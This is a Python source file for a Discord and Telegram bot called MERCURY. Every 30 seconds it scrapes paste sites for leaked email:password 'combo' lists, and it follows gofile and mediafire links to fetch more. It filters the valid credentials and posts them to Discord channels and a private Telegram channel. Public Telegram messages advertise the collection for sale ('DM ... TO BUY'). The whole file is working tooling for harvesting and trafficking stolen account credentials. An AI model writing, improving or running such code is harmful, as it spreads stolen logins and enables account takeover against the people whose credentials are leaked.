"""
MERCURY — Discord Bot
Scrapes Pasteview every 30 seconds, posts to 3 Discord channels + Telegram.
"""

import asyncio
import io
import json
import logging
import os
import random
import re
import time
from datetime import datetime, timezone
from pathlib import Path

import aiohttp

import discord
from discord.ext import commands, tasks
from discord import app_commands
from playwright.async_api import async_playwright

# ─── CONFIG ──────────────────────────────────────────────────────────────────
DISCORD_TOKEN      = os.environ["DISCORD_TOKEN"]
CHANNEL_ID         = int(os.environ["CHANNEL_ID"])
NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])
CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"])
TELEGRAM_TOKEN     = os.environ["TELEGRAM_TOKEN"]
TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]
TELEGRAM_PUBLIC_CHAT  = os.environ["TELEGRAM_PUBLIC_CHAT"]
TELEGRAM_PUBLIC_CHAT2 = os.environ["TELEGRAM_PUBLIC_CHAT2"]
OWNER_ID           = int(os.environ["OWNER_ID"])

CHECK_INTERVAL   = 30
PAGES_TO_SCAN    = 5
ARCHIVE_URL      = "https://pasteview.com/paste-archive"
PASTEDPW_URL     = "https://pasted.pw/recent.php"
SEEN_FILE        = "seen_urls.json"
EMPTY_SCAN_ALERT = 10
KEYWORDS         = ["hotmail", "hits", "mixed"]
BLACKLIST        = ["omegle", "teens", "bro", "sis", "sister", "brother", "incest", "minor", "underage"]

# ─── LOGGING ─────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("mercury")

# ─── STATE ───────────────────────────────────────────────────────────────────
start_time = time.time()
stats      = {"total_pastes": 0, "total_combos": 0, "scans": 0, "empty_scans": 0}
scan_lock  = asyncio.Lock()

private_post_count = 0  # counts private channel posts, public update every 10
recent_filenames   = []  # tracks last 10 posted filenames for public update

# ─── FEATURE TOGGLES ─────────────────────────────────────────────────────────
toggles = {
    "scanning":        True,   # master on/off for scanning
    "discord_urls":    True,   # post URL list to channel 1
    "discord_alerts":  True,   # post new URL alerts to channel 2
    "discord_content": True,   # post combo file to channel 3
    "telegram":        True,   # post to private telegram
    "telegram_public": True,   # post update message to public telegram
    "owner_dm":        True,   # DM owner on new file
}

def load_seen() -> set:
    if Path(SEEN_FILE).exists():
        try:
            with open(SEEN_FILE) as f:
                return set(json.load(f))
        except Exception:
            pass
    return set()

def save_seen(seen: set):
    try:
        with open(SEEN_FILE, "w") as f:
            json.dump(list(seen), f)
    except Exception as e:
        log.error(f"Failed to save seen URLs: {e}")

posted_urls: set = load_seen()

# ─── CREDENTIAL VALIDATION ───────────────────────────────────────────────────
EMOJI_RE = re.compile(
    "["
    u"\U0001F600-\U0001F64F"
    u"\U0001F300-\U0001F5FF"
    u"\U0001F680-\U0001F9FF"
    u"\U00002600-\U000027BF"
    u"\U0001FA00-\U0001FA6F"
    u"\U0001FA70-\U0001FAFF"
    u"\U00002702-\U000027B0"
    "]+", flags=re.UNICODE
)
JUNK_DOMAINS   = ("t.me", "telegram.me", "discord.gg", "http://", "https://")
VALID_EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")

def is_valid_combo(line: str) -> bool:
    if not line or len(line) > 200 or "|" in line:
        return False
    if EMOJI_RE.search(line) or any(d in line.lower() for d in JUNK_DOMAINS):
        return False
    if ":" not in line:
        return False
    parts = line.split(":", 1)
    email, password = parts[0].strip(), parts[1].strip()
    if not password or len(password) < 3:
        return False
    return bool(VALID_EMAIL_RE.match(email))

def extract_credentials(raw: str) -> list[str]:
    seen, lines = set(), []
    for line in raw.splitlines():
        line = line.strip()
        if line and is_valid_combo(line) and line not in seen:
            seen.add(line)
            lines.append(line)
    return lines


# ─── TELEGRAM ────────────────────────────────────────────────────────────────
async def send_telegram_file(text, filename: str):
    url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    data = aiohttp.FormData()
    data.add_field("chat_id", TELEGRAM_CHAT)
    content = text.encode() if isinstance(text, str) else text
    data.add_field("document", content, filename=filename, content_type="application/octet-stream")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data) as resp:
                if resp.status != 200:
                    body = await resp.text()
                    log.error(f"Telegram API error {resp.status}: {body}")
                else:
                    log.info("Posted to Telegram")
    except Exception as e:
        log.error(f"Failed to send to Telegram: {e}")

# ─── BOT ─────────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
bot  = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

async def post_pastes(channel, pastes: list[dict]):
    if not pastes:
        return
    try:
        content  = "\n".join(item["url"] for item in pastes)
        filename = f"hotmail_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
        await channel.send(file=discord.File(fp=io.BytesIO(content.encode()), filename=filename))
    except Exception as e:
        log.error(f"Failed to post file: {e}")

async def post_new_alerts(channel, pastes: list[dict]):
    for item in pastes:
        try:
            await channel.send(f"= DETECTED 1 NEW URL =\n{item['url']}")
            await asyncio.sleep(0.5)
        except Exception as e:
            log.error(f"Failed to post alert: {e}")

async def extract_raw(page, url: str) -> str:
    for attempt in range(2):
        try:
            await page.goto(url, wait_until="networkidle", timeout=15000)
            await page.wait_for_timeout(1500)

            raw = await page.evaluate("""
                () => {
                    if (window.ace) {
                        const editors = document.querySelectorAll('.ace_editor');
                        for (let ed of editors) {
                            try { const v = ace.edit(ed).getValue(); if (v && v.trim()) return v; } catch(e) {}
                        }
                    }
                    return null;
                }
            """)

            if not raw or not raw.strip():
                await page.evaluate("() => { const s = document.querySelector('.ace_scroller'); if (s) s.scrollTop = s.scrollHeight; }")
                await page.wait_for_timeout(800)
                lines = await page.query_selector_all("div.ace_line")
                raw   = "\n".join([(await l.text_content() or "").strip() for l in lines])

            if not raw or not raw.strip():
                pre = await page.query_selector("pre")
                if pre:
                    raw = await pre.text_content()

            if raw and raw.strip():
                return raw

        except Exception as e:
            log.error(f"Extract attempt {attempt+1} failed for {url}: {e}")
            if attempt == 0:
                await asyncio.sleep(2)

    return ""

# ─── HOST LINK EXTRACTOR ─────────────────────────────────────────────────────
GOFILE_RE    = re.compile(r'https?://gofile\.io/d/([a-zA-Z0-9]+)')
MEDIAFIRE_RE = re.compile(r'https?://(?:www\.)?mediafire\.com/file/([a-zA-Z0-9]+)')

async def fetch_gofile(code: str) -> str:
    """Fetch combos from a gofile link using the API."""
    try:
        async with aiohttp.ClientSession() as sess:
            # Get guest token
            async with sess.get("https://api.gofile.io/accounts") as r:
                data = await r.json()
                token = data.get("data", {}).get("token")
            if not token:
                return ""
            # Get folder contents
            async with sess.get(f"https://api.gofile.io/contents/{code}?wt=4fd6sg89d7s6&cache=true",
                                 headers={"Authorization": f"Bearer {token}"}) as r:
                data = await r.json()
            if data.get("status") != "ok":
                return ""
            files = data.get("data", {}).get("children", {})
            all_text = []
            for f in files.values():
                if f.get("type") == "file" and f.get("name", "").endswith(".txt"):
                    dl_url = f.get("link", "")
                    if dl_url:
                        async with sess.get(dl_url, headers={"Authorization": f"Bearer {token}"}) as r:
                            all_text.append(await r.text(errors="ignore"))
            return "\n".join(all_text)
    except Exception as e:
        log.error(f"Gofile fetch error: {e}")
        return ""

async def fetch_mediafire(file_id: str, page) -> str:
    """Fetch combos from a mediafire link using Playwright."""
    try:
        await page.goto(f"https://www.mediafire.com/file/{file_id}", wait_until="networkidle", timeout=15000)
        # Find direct download link
        dl_link = await page.evaluate("""
            () => {
                const a = document.querySelector('a#downloadButton') || document.querySelector('a.input.btn.green');
                return a ? a.href : null;
            }
        """)
        if not dl_link:
            return ""
        async with aiohttp.ClientSession() as sess:
            async with sess.get(dl_link) as r:
                return await r.text(errors="ignore")
    except Exception as e:
        log.error(f"Mediafire fetch error: {e}")
        return ""

async def extract_from_hosts(raw: str, page) -> str:
    """Check raw text for gofile/mediafire links and fetch their contents."""
    extra = []
    for match in GOFILE_RE.finditer(raw):
        log.info(f"Found gofile link: {match.group(0)}")
        text = await fetch_gofile(match.group(1))
        if text:
            extra.append(text)
    for match in MEDIAFIRE_RE.finditer(raw):
        log.info(f"Found mediafire link: {match.group(0)}")
        text = await fetch_mediafire(match.group(1), page)
        if text:
            extra.append(text)
    return "\n".join(extra)

async def scrape_pastedpw(page, pages: int = 5) -> list[dict]:
    """Scrape pasted.pw for keyword-matching pastes."""
    found = []
    for page_num in range(1, pages + 1):
        url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(2000)
            matches = await page.evaluate("""
                (keywords) => {
                    const results = [];
                    for (const a of document.querySelectorAll('a')) {
                        const text = (a.innerText || a.textContent || '').toLowerCase();
                        if (keywords.some(k => text.includes(k))) {
                            const href = a.href;
                            if (href && href.includes('pasted.pw') && !href.includes('recent')) {
                                results.push({
                                    title: (a.innerText || a.textContent || '').trim().replace(/\s+/g, ' '),
                                    url: href,
                                    source: 'pasted.pw'
                                });
                            }
                        }
                    }
                    return results;
                }
            """, KEYWORDS)
            log.info(f"pasted.pw page {page_num}: {len(matches)} match(es)")
            found.extend(matches)
        except Exception as e:
            log.error(f"pasted.pw page {page_num} failed: {e}")
    return found


# ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
@tasks.loop(seconds=CHECK_INTERVAL)
async def monitor_loop():
    try:
        channel = bot.get_channel(CHANNEL_ID) or await bot.fetch_channel(CHANNEL_ID)
    except Exception as e:
        log.error(f"Could not get channel: {e}")
        return

    if not toggles["scanning"]:
        return

    if scan_lock.locked():
        log.info("Scan already in progress, skipping this cycle")
        return

    async with scan_lock:
        stats["scans"] += 1
        log.info(f"Running scan #{stats['scans']}...")

        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
            )
            page = await browser.new_page()

            try:
                # ── Step 1: load archive ───────────────────────────────────
                for attempt in range(3):
                    try:
                        await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000)
                        await page.wait_for_timeout(2000)
                        break
                    except Exception as e:
                        log.warning(f"Archive load attempt {attempt+1} failed: {e}")
                        if attempt == 2:
                            log.error("Archive failed after 3 attempts, skipping scan")
                            return
                        await asyncio.sleep(3)

                # ── Step 2: scrape pages ───────────────────────────────────
                found = []
                for page_num in range(1, PAGES_TO_SCAN + 1):
                    if page_num > 1:
                        navigated = False
                        buttons   = await page.query_selector_all("button")
                        for btn in buttons:
                            text = await btn.text_content()
                            if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
                                disabled  = await btn.get_attribute("disabled")
                                aria_dis  = await btn.get_attribute("aria-disabled")
                                if disabled is not None or aria_dis == "true":
                                    break
                                await btn.click()
                                await page.wait_for_timeout(2000)
                                navigated = True
                                break
                        if not navigated:
                            break

                    matches = await page.evaluate("""
                        (keywords) => {
                            const results = [];
                            for (const a of document.querySelectorAll('a')) {
                                const text = (a.innerText || a.textContent || '').toLowerCase();
                                if (keywords.some(k => text.includes(k))) {
                                    const href = a.href;
                                    if (href
                                        && !href.includes('/paste-archive')
                                        && !href.includes('/new')
                                        && !href.endsWith('/')
                                        && href !== window.location.href) {
                                        results.push({
                                            title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
                                            url: href
                                        });
                                    }
                                }
                            }
                            return results;
                        }
                    """, KEYWORDS)
                    log.info(f"Page {page_num}: {len(matches)} match(es)")
                    found.extend(matches)

                # ── Also scrape pasted.pw ─────────────────────────────
                try:
                    pw_found = await scrape_pastedpw(page, PAGES_TO_SCAN)
                    found.extend(pw_found)
                    log.info(f"pasted.pw total: {len(pw_found)} match(es)")
                except Exception as e:
                    log.error(f"pasted.pw scrape failed: {e}")

                # Deduplicate and filter blacklisted titles
                seen_this_run = set()
                pastes        = []
                for item in found:
                    if item["url"] in seen_this_run:
                        continue
                    if any(b in item["title"].lower() for b in BLACKLIST):
                        log.info(f"Skipping blacklisted paste: {item['title']}")
                        continue
                    seen_this_run.add(item["url"])
                    pastes.append(item)

                stats["total_pastes"] += len(pastes)

                # ── Step 3: post all URLs to channel 1 ────────────────────
                await post_pastes(channel, pastes)

                # ── Step 4: filter new pastes & mark seen ─────────────────
                new_pastes = [p for p in pastes if p["url"] not in posted_urls]
                if not new_pastes:
                    stats["empty_scans"] += 1
                    log.info(f"No new pastes (empty streak: {stats['empty_scans']})")
                    if stats["empty_scans"] == EMPTY_SCAN_ALERT:
                        try:
                            owner = await bot.fetch_user(OWNER_ID)
                            await owner.send(f"⚠️ MERCURY: No new pastes in {EMPTY_SCAN_ALERT} consecutive scans.")
                        except Exception as e:
                            log.error(f"Failed to DM owner: {e}")
                    return

                stats["empty_scans"] = 0
                for p in new_pastes:
                    posted_urls.add(p["url"])
                save_seen(posted_urls)
                log.info(f"{len(new_pastes)} new paste(s) detected")

                # ── Step 5: new URL alerts to channel 2 ───────────────────
                if toggles["discord_alerts"]:
                    try:
                        new_channel = bot.get_channel(NEW_CHANNEL_ID) or await bot.fetch_channel(NEW_CHANNEL_ID)
                        await post_new_alerts(new_channel, new_pastes)
                    except Exception as e:
                        log.error(f"Could not post to new channel: {e}")

                # ── Step 6: extract creds & post to channel 3 ─────────────
                try:
                    content_channel = bot.get_channel(CONTENT_CHANNEL_ID) or await bot.fetch_channel(CONTENT_CHANNEL_ID)
                    combined        = []

                    for item in new_pastes[:5]:
                        url = item["url"]
                        log.info(f"Extracting from {url}")
                        raw = await extract_raw(page, url)
                        # Also check for gofile/mediafire links inside the paste
                        if raw:
                            host_content = await extract_from_hosts(raw, page)
                            if host_content:
                                raw = raw + "\n" + host_content
                        if raw:
                            creds = extract_credentials(raw)
                            if creds:
                                combined.append("\n".join(creds))
                                stats["total_combos"] += len(creds)
                                log.info(f"✓ {len(creds)} valid combos from {url}")
                            else:
                                log.info(f"No valid combos in {url}")
                        else:
                            log.info(f"No content extracted from {url}")


                    if combined:
                        # Flatten all creds
                        all_raw = [l for b in combined for l in b.splitlines() if l.strip()]

                        # Determine label
                        title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
                        if "hotmail" in title_lower_check:
                            label = "hotmail"
                        elif "hits" in title_lower_check:
                            label = "hits"
                        elif "mix" in title_lower_check or "mixed" in title_lower_check:
                            label = "mix"
                        else:
                            label = "content"

                        valid_hits = all_raw
                        combined = ["\n".join(valid_hits)]

                    if combined:
                        output   = "\n\n".join(combined)
                        filename = f"{len(valid_hits)} {label.upper()}.txt"

                        # Discord — post full file + ZIP (if not mix)
                        if toggles["discord_content"]:
                            try:
                                await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
                                log.info(f"Posted main file to Discord: {filename}")
                            except Exception as e:
                                log.error(f"Failed to post main file to Discord: {e}")


                        # DM owner
                        if toggles["owner_dm"]:
                            try:
                                owner = await bot.fetch_user(OWNER_ID)
                                total = sum(len(b.splitlines()) for b in combined)
                                await owner.send(f"✅ New {label.upper()} detected — {total} combos")
                            except Exception as e:
                                log.error(f"Failed to DM owner: {e}")

                        # Telegram
                        if toggles["telegram"]:
                            all_creds = [l for b in combined for l in b.splitlines() if l.strip()]
                            random.shuffle(all_creds)
                            tg_header = (
                                f"WAR CLOUD PRIVATE {label.upper()}\n"
                                "------------------------\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                            )
                            await send_telegram_file(tg_header + "\n".join(all_creds), filename)


                            if toggles["telegram_public"]:
                                private_post_count_ref = globals()
                                private_post_count_ref["private_post_count"] += 1
                                private_post_count_ref["recent_filenames"].append(filename)
                                log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
                                if private_post_count_ref["private_post_count"] >= 2:
                                    private_post_count_ref["private_post_count"] = 0
                                    file_list = "\n".join(f"  • {fn}" for fn in private_post_count_ref["recent_filenames"])
                                    private_post_count_ref["recent_filenames"] = []
                                    pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
                                    promo_path = os.path.join("/app", "promo.png")
                                    async with aiohttp.ClientSession() as sess:
                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:
                                            try:
                                                if os.path.exists(promo_path):
                                                    form = aiohttp.FormData()
                                                    form.add_field("chat_id", pub_chat)
                                                    form.add_field("caption", pub_text)
                                                    with open(promo_path, "rb") as img:
                                                        form.add_field("photo", img.read(), filename="promo.png", content_type="image/png")
                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data=form)
                                                    body = await resp.json()
                                                    if not body.get("ok"):
                                                        log.error(f"Telegram sendPhoto failed: {body}")
                                                    else:
                                                        log.info(f"Posted public update with image to {pub_chat}")
                                                else:
                                                    log.warning(f"promo.png not found at {promo_path}, sending text only")
                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                                        json={"chat_id": pub_chat, "text": pub_text})
                                                    body = await resp.json()
                                                    if not body.get("ok"):
                                                        log.error(f"Telegram sendMessage failed: {body}")
                                                    else:
                                                        log.info(f"Posted public update to {pub_chat}")
                                            except Exception as e:
                                                log.error(f"Failed to post public update to {pub_chat}: {e}")


                    else:
                        log.info("Nothing to post to content channel")

                except Exception as e:
                    log.error(f"Could not post to content channel: {e}")

            except Exception as e:
                log.error(f"Monitor loop error: {e}")
                stats["empty_scans"] += 1
            finally:
                await browser.close()


@monitor_loop.before_loop
async def before_monitor():
    await bot.wait_until_ready()


@tasks.loop(seconds=60)
async def watchdog():
    """Restart monitor loop if it dies."""
    if not monitor_loop.is_running():
        log.warning("Monitor loop was dead, restarting...")
        monitor_loop.start()


@watchdog.before_loop
async def before_watchdog():
    await bot.wait_until_ready()

# ─── SLASH COMMANDS ───────────────────────────────────────────────────────────
@tree.command(name="scrape", description="Manually trigger a scrape right now")
@app_commands.describe(pages="Number of archive pages to scan (default: 5)")
async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCAN):
    await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
    await monitor_loop()
    await interaction.followup.send("✅ Done.", ephemeral=True)


@tree.command(name="toggle", description="Enable or disable a bot feature")
@app_commands.describe(feature="Feature to toggle")
@app_commands.choices(feature=[
    app_commands.Choice(name="scanning",        value="scanning"),
    app_commands.Choice(name="discord_urls",    value="discord_urls"),
    app_commands.Choice(name="discord_alerts",  value="discord_alerts"),
    app_commands.Choice(name="discord_content", value="discord_content"),
    app_commands.Choice(name="telegram",        value="telegram"),
    app_commands.Choice(name="telegram_public", value="telegram_public"),
    app_commands.Choice(name="owner_dm",        value="owner_dm"),
])
async def cmd_toggle(interaction: discord.Interaction, feature: str):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ Only the owner can use this.", ephemeral=True)
        return
    toggles[feature] = not toggles[feature]
    state = "✅ ON" if toggles[feature] else "❌ OFF"
    await interaction.response.send_message(f"`{feature}` is now {state}", ephemeral=True)


@tree.command(name="toggles", description="Show current status of all toggles")
async def cmd_toggles(interaction: discord.Interaction):
    lines = [f"{'✅' if v else '❌'} `{k}`" for k, v in toggles.items()]
    await interaction.response.send_message("\n".join(lines), ephemeral=True)



@tree.command(name="stats", description="Show bot stats")
async def cmd_stats(interaction: discord.Interaction):
    uptime_secs      = int(time.time() - start_time)
    hours, remainder = divmod(uptime_secs, 3600)
    minutes, seconds = divmod(remainder, 60)
    embed = discord.Embed(title="MERCURY // STATS", color=0xCC0000, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="Uptime",       value=f"{hours}h {minutes}m {seconds}s", inline=True)
    embed.add_field(name="Scans Run",    value=str(stats["scans"]),               inline=True)
    embed.add_field(name="Pastes Found", value=str(stats["total_pastes"]),        inline=True)
    embed.add_field(name="Combos Found", value=str(stats["total_combos"]),        inline=True)
    embed.add_field(name="URLs Tracked", value=str(len(posted_urls)),             inline=True)
    embed.add_field(name="Check Every",  value=f"{CHECK_INTERVAL}s",             inline=True)
    await interaction.response.send_message(embed=embed)

# ─── EVENTS ──────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        synced = await tree.sync()
        log.info(f"Synced {len(synced)} slash command(s)")
    except Exception as e:
        log.error(f"Failed to sync commands: {e}")

    # Delete Telegram webhook so it doesnt process channel messages
    try:
        async with aiohttp.ClientSession() as sess:
            await sess.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true")
            log.info("Telegram webhook cleared")
    except Exception as e:
        log.error(f"Failed to clear Telegram webhook: {e}")
    if not monitor_loop.is_running():
        monitor_loop.start()
        log.info(f"Monitor started — checking every {CHECK_INTERVAL}s")
    else:
        log.info("Monitor already running after reconnect")
    if not watchdog.is_running():
        watchdog.start()

@bot.event
async def on_resumed():
    log.info("Discord session resumed")
    if not monitor_loop.is_running():
        monitor_loop.start()
        log.info("Monitor restarted after resume")
    if not watchdog.is_running():
        watchdog.start()

# ─── RUN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    bot.run(DISCORD_TOKEN, log_handler=None)
